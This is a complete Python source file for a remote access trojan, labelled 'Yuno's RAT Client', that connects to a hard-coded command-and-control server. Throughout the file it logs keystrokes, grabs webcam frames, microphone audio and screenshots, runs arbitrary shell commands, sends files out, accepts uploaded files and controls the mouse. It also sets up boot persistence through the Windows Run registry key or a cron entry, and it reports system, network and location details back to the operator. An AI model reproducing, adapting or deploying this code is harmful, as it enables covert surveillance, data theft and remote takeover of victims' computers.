#!/usr/bin/env python3
import platform
import subprocess
import json
import time
import os
import threading
import psutil
import netifaces
from socketio import Client
import cv2
import pyaudio
import wave
import numpy as np
from PIL import ImageGrab
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Controller as MouseController, Listener as MouseListener
import base64
import requests
import winreg
import getpass

# Server settings
SERVER_URL = "https://c2-backend-wily.onrender.com"

def get_system_info():
    """Gather system information including username."""
    info = {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_version": platform.release(),
        "architecture": platform.machine(),
    }
    try:
        if platform.system() == "Windows":
            username = subprocess.run("echo %USERNAME%", shell=True, capture_output=True, text=True).stdout.strip()
        else:
            username = subprocess.run("whoami", shell=True, capture_output=True, text=True).stdout.strip()
        info["username"] = username
    except Exception as e:
        print(f"[!] Error getting username: {e}")
        info["username"] = "unknown"
    return info

def get_network_info():
    """Gather network interface information."""
    interfaces = netifaces.interfaces()
    network_info = {}
    ip_addresses = []
    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            for addr in addrs[netifaces.AF_INET]:
                ip = addr.get("addr", "Unknown")
                network_info[iface] = ip
                if ip != "127.0.0.1":
                    ip_addresses.append(ip)

    # Get public IP and location
    try:
        public_ip = requests.get("https://api.ipify.org").text
        location_data = requests.get(f"https://ipapi.co/{public_ip}/json/").json()
        location = f"{location_data.get('city', 'Unknown')}, {location_data.get('country_name', 'Unknown')}"
        ip_addresses.append(public_ip)
    except Exception as e:
        print(f"[!] Error getting public IP/location: {e}")
        location = "Unknown"

    info = {
        "interfaces": network_info,
        "ip_addresses": ip_addresses,
        "location": location
    }
    return info

def can_run_sudo():
    """Check if sudo can run."""
    try:
        result = subprocess.run("sudo -n true", shell=True, capture_output=True, text=True)
        return result.returncode == 0
    except subprocess.CalledProcessError as e:
        print(f"[!] sudo test failed: {e}")
        return False
    except Exception as e:
        print(f"[!] Error checking sudo: {e}")
        return False

def monitor_network(sio):
    """Monitor network traffic and speed."""
    last_bytes_sent = psutil.net_io_counters().bytes_sent
    last_bytes_recv = psutil.net_io_counters().bytes_recv
    last_time = time.time()

    while True:
        time.sleep(5)
        try:
            current_time = time.time()
            current_io = psutil.net_io_counters()
            bytes_sent = current_io.bytes_sent
            bytes_recv = current_io.bytes_recv

            time_diff = current_time - last_time
            sent_speed = ((bytes_sent - last_bytes_sent) * 8 / time_diff) / (1024 * 1024)
            recv_speed = ((bytes_recv - last_bytes_recv) * 8 / time_diff) / (1024 * 1024)

            network_data = {
                "type": "network_data",
                "timestamp": current_time,
                "bytes_sent": bytes_sent,
                "bytes_recv": bytes_recv,
                "sent_speed_mbps": round(sent_speed, 2),
                "recv_speed_mbps": round(recv_speed, 2)
            }
            sio.emit('exfil_data', json.dumps(network_data))
            print(f"[*] Sent network data: {network_data}")

            last_bytes_sent = bytes_sent
            last_bytes_recv = bytes_recv
            last_time = current_time
        except Exception as e:
            print(f"[!] Error monitoring network: {e}")

def monitor_system(sio):
    """Monitor CPU and memory usage."""
    while True:
        time.sleep(5)
        try:
            cpu_usage = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            memory_usage_mb = memory.used / (1024 * 1024)

            system_data = {
                "type": "system_data",
                "timestamp": time.time(),
                "cpu_usage_percent": round(cpu_usage, 2),
                "memory_usage_mb": round(memory_usage_mb, 2)
            }
            sio.emit('exfil_data', json.dumps(system_data))
            print(f"[*] Sent system data: {system_data}")
        except Exception as e:
            print(f"[!] Error monitoring system: {e}")

def capture_webcam(sio):
    """Capture a single frame from the webcam."""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print("[!] Webcam not accessible")
            sio.emit('exfil_data', json.dumps({"type": "webcam_error", "message": "Webcam not accessible"}))
            return
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, img_encoded = cv2.imencode('.jpg', frame)
            img_base64 = base64.b64encode(img_encoded.tobytes()).decode('utf-8')
            sio.emit('exfil_data', json.dumps({
                "type": "webcam_data",
                "client_id": sio.sid,
                "image": img_base64
            }))
            print("[*] Sent webcam data")
        else:
            print("[!] Failed to capture webcam frame")
    except Exception as e:
        print(f"[!] Error capturing webcam: {e}")
        sio.emit('exfil_data', json.dumps({"type": "webcam_error", "message": str(e)}))

def record_mic(sio, duration=5):
    """Record audio from mic for a specified duration."""
    try:
        # Check if mic is available
        p = pyaudio.PyAudio()
        device_count = p.get_device_count()
        mic_available = False
        for i in range(device_count):
            device_info = p.get_device_info_by_index(i)
            if device_info['maxInputChannels'] > 0:
                mic_available = True
                break
        if not mic_available:
            print("[!] No microphone detected")
            sio.emit('exfil_data', json.dumps({"type": "mic_error", "message": "No microphone detected"}))
            p.terminate()
            return

        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100

        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = []

        print("[*] Recording mic...")
        for _ in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK, exception_on_overflow=False)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        p.terminate()

        # Ensure file is properly written
        timestamp = time.time()
        mic_file = f"mic_{timestamp}.wav"
        wf = wave.open(mic_file, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()

        # Verify file exists before reading
        if os.path.exists(mic_file):
            with open(mic_file, "rb") as audio_file:
                audio_base64 = base64.b64encode(audio_file.read()).decode('utf-8')
                sio.emit('exfil_data', json.dumps({
                    "type": "mic_data",
                    "client_id": sio.sid,
                    "audio": audio_base64
                }))
                print("[*] Sent mic data")
            os.remove(mic_file)
        else:
            print(f"[!] Mic file {mic_file} not found after writing")
            sio.emit('exfil_data', json.dumps({"type": "mic_error", "message": f"Mic file {mic_file} not found"}))
    except Exception as e:
        print(f"[!] Error recording mic: {e}")
        sio.emit('exfil_data', json.dumps({"type": "mic_error", "message": str(e)}))

def take_screenshot(sio):
    """Capture a screenshot."""
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        with open("screenshot.png", "rb") as img_file:
            img_base64 = base64.b64encode(img_file.read()).decode('utf-8')
            sio.emit('exfil_data', json.dumps({
                "type": "screenshot_data",
                "client_id": sio.sid,
                "image": img_base64
            }))
            print("[*] Sent screenshot")
        os.remove("screenshot.png")
    except Exception as e:
        print(f"[!] Error taking screenshot: {e}")
        sio.emit('exfil_data', json.dumps({"type": "screenshot_error", "message": str(e)}))

def on_mouse_move(x, y):
    print(f"[*] Mouse moved to ({x}, {y})")

def on_mouse_click(x, y, button, pressed):
    if pressed:
        print(f"[*] Mouse clicked at ({x}, {y}) with {button}")

def on_keyboard_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key}\n")

def start_keylogger(sio):
    """Start keylogger and send logs periodically using background task."""
    def send_keylog():
        while True:
            time.sleep(10)  # Send logs every 10 seconds
            try:
                if os.path.exists("keylog.txt"):
                    with open("keylog.txt", "r") as f:
                        logs = f.read()
                    if logs:
                        sio.emit('exfil_data', json.dumps({
                            "type": "keylog_data",
                            "client_id": sio.sid,
                            "logs": logs
                        }))
                        print("[*] Sent keylog data")
                    # Do not clear logs here; let the server handle clearing
            except Exception as e:
                print(f"[!] Error sending keylog: {e}")
    
    with KeyboardListener(on_press=on_keyboard_press) as listener:
        sio.start_background_task(send_keylog)
        listener.join()

def clear_keylogs(sio):
    """Clear keylogs on demand."""
    try:
        with open("keylog.txt", "w") as f:
            f.write("")
        sio.emit('exfil_data', json.dumps({
            "type": "keylog_data",
            "client_id": sio.sid,
            "logs": ""
        }))
        print("[*] Cleared keylogs")
    except Exception as e:
        print(f"[!] Error clearing keylogs: {e}")

def setup_persistence(sio):
    """Set up persistence for the client to run on boot."""
    try:
        script_path = os.path.abspath(__file__)
        if platform.system() == "Windows":
            # Add to Windows Registry
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "RATClient", 0, winreg.REG_SZ, f"python {script_path}")
            winreg.CloseKey(key)
            output = "Persistence set up via Windows Registry"
        else:
            # Add to Linux cronjob
            username = getpass.getuser()
            cron_cmd = f"@reboot {username} python3 {script_path}"
            result = subprocess.run("crontab -l", shell=True, capture_output=True, text=True)
            existing_crons = result.stdout if result.returncode == 0 else ""
            if cron_cmd not in existing_crons:
                new_crons = existing_crons + cron_cmd + "\n"
                subprocess.run("crontab", input=new_crons, text=True)
            output = "Persistence set up via cronjob"
        
        sio.emit('exfil_data', json.dumps({
            "type": "command_output",
            "command": "setup_persistence",
            "output": output,
            "current_dir": os.getcwd()
        }))
        print(f"[*] {output}")
    except Exception as e:
        error_msg = f"Error setting up persistence: {e}"
        sio.emit('exfil_data', json.dumps({
            "type": "command_output",
            "command": "setup_persistence",
            "output": error_msg,
            "current_dir": os.getcwd()
        }))
        print(f"[!] {error_msg}")

def execute_command(command, sio):
    """Execute a system command."""
    try:
        if command.strip().lower() == "whoami":
            if platform.system() == "Windows":
                result = subprocess.run("echo %USERNAME%", shell=True, capture_output=True, text=True)
            else:
                result = subprocess.run("whoami", shell=True, capture_output=True, text=True)
            return result.stdout + result.stderr
        elif command.strip().lower().startswith("cd "):
            target_dir = command.strip().split("cd ", 1)[1].strip()
            target_dir = os.path.normpath(target_dir)
            os.chdir(target_dir)
            return f"Changed directory to {os.getcwd()}"
        elif command.strip().lower().startswith("sudo "):
            if not can_run_sudo():
                return "Error: sudo is blocked in this environment (no new privileges flag). Use non-root commands."
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=os.getcwd())
                return result.stdout + result.stderr
        elif command.strip().lower() == "help":
            commands = [
                "webcam - Capture webcam image",
                "mic - Record audio from microphone",
                "screenshot - Take a screenshot",
                "move x y - Move mouse to (x, y)",
                "click button - Click mouse (button: left, right)",
                "download <path> - Download a file from client",
                "upload <file> - Upload a file to client (via web interface)",
                "clear_keylogs - Clear keylogs",
                "setup_persistence - Set up client to run on boot",
                "exit - Disconnect client"
            ]
            return "\n".join(commands)
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=os.getcwd())
            return result.stdout + result.stderr
    except Exception as e:
        return f"Error executing command: {e}"

def handle_mouse_control(command, sio):
    """Handle mouse control commands."""
    mouse = MouseController()
    parts = command.split()
    if len(parts) >= 3 and parts[0].lower() == "move":
        try:
            x, y = int(parts[1]), int(parts[2])
            mouse.position = (x, y)
            sio.emit('exfil_data', json.dumps({
                "type": "command_output",
                "command": command,
                "output": f"Mouse moved to ({x}, {y})",
                "current_dir": os.getcwd()
            }))
        except ValueError:
            sio.emit('exfil_data', json.dumps({
                "type": "command_output",
                "command": command,
                "output": "Invalid coordinates",
                "current_dir": os.getcwd()
            }))
    elif len(parts) >= 2 and parts[0].lower() == "click":
        button = parts[1].lower()
        if button in ["left", "right"]:
            mouse.click(getattr(mouse, f"press_{button}"), getattr(mouse, f"release_{button}"))
            sio.emit('exfil_data', json.dumps({
                "type": "command_output",
                "command": command,
                "output": f"Clicked {button} button",
                "current_dir": os.getcwd()
            }))
        else:
            sio.emit('exfil_data', json.dumps({
                "type": "command_output",
                "command": command,
                "output": "Invalid button (use left or right)",
                "current_dir": os.getcwd()
            }))

def handle_file_download(command, sio):
    """Handle file download from victim."""
    try:
        path = command.split("download ")[1].strip()
        if os.path.exists(path):
            with open(path, "rb") as f:
                file_data = base64.b64encode(f.read()).decode('utf-8')
                sio.emit('exfil_data', json.dumps({
                    "type": "file_download",
                    "client_id": sio.sid,
                    "filename": os.path.basename(path),
                    "data": file_data
                }))
                print(f"[*] Sent file {path}")
        else:
            sio.emit('exfil_data', json.dumps({
                "type": "command_output",
                "command": command,
                "output": f"File {path} not found",
                "current_dir": os.getcwd()
            }))
    except Exception as e:
        sio.emit('exfil_data', json.dumps({
            "type": "command_output",
            "command": command,
            "output": f"Error downloading file: {e}",
            "current_dir": os.getcwd()
        }))

def handle_file_upload(filename, data, sio):
    """Handle file upload to victim."""
    try:
        file_data = base64.b64decode(data)
        with open(os.path.join(os.getcwd(), filename), "wb") as f:
            f.write(file_data)
        sio.emit('exfil_data', json.dumps({
            "type": "command_output",
            "command": f"upload {filename}",
            "output": f"File {filename} uploaded",
            "current_dir": os.getcwd()
        }))
        print(f"[*] Received and saved {filename}")
    except Exception as e:
        sio.emit('exfil_data', json.dumps({
            "type": "command_output",
            "command": f"upload {filename}",
            "output": f"Error uploading file: {e}",
            "current_dir": os.getcwd()
        }))

def main():
    sio = Client()
    try:
        @sio.event
        def connect():
            print(f"[*] Connected to RAT server with SID: {sio.sid}")
            system_info = get_system_info()
            network_info = get_network_info()
            exfil_data = {
                "system": system_info,
                "network": network_info,
                "type": "system_info"
            }
            sio.emit('exfil_data', json.dumps(exfil_data))
            print("[*] Exfiltrated data sent to RAT server")

            # Start monitoring threads
            sio.start_background_task(monitor_network, sio)
            sio.start_background_task(monitor_system, sio)
            sio.start_background_task(start_keylogger, sio)

        @sio.event
        def disconnect():
            print(f"[*] Disconnected from RAT server with SID: {sio.sid}")

        @sio.event
        def connect_error(data):
            print(f"[!] Connection failed: {data}")

        @sio.event
        def command(data):
            print(f"[*] Received command: {data}")
            if data.strip().lower() == "exit":
                print("[*] Received exit command")
                sio.disconnect()
                return
            elif data.strip().lower() == "webcam":
                capture_webcam(sio)
            elif data.strip().lower() == "mic":
                record_mic(sio)
            elif data.strip().lower() == "screenshot":
                take_screenshot(sio)
            elif data.strip().lower() == "clear_keylogs":
                clear_keylogs(sio)
            elif data.strip().lower() == "setup_persistence":
                setup_persistence(sio)
            elif data.strip().lower().startswith("move ") or data.strip().lower().startswith("click "):
                handle_mouse_control(data, sio)
            elif data.strip().lower().startswith("download "):
                handle_file_download(data, sio)
            else:
                output = execute_command(data, sio)
                sio.emit('exfil_data', json.dumps({
                    "type": "command_output",
                    "command": data,
                    "output": output,
                    "current_dir": os.getcwd()
                }))

        @sio.event
        def upload_file(data):
            print(f"[*] Received upload command with data: {data}")
            handle_file_upload(data.get("filename"), data.get("data"), sio)

        while True:
            try:
                print(f"[*] Attempting to connect to {SERVER_URL}")
                sio.connect(SERVER_URL, transports=['websocket'], wait_timeout=10)
                sio.wait()
                break
            except Exception as e:
                print(f"[!] Connection failed: {str(e)}")
                print("[*] Retrying in 5 seconds...")
                time.sleep(5)
    except KeyboardInterrupt:
        print("[*] Shutting down client...")
    finally:
        if sio.connected:
            sio.disconnect()

if __name__ == "__main__":
    print("=== Yuno's RAT Client ===")
    print("A remote access client by Yuno\n")
    main()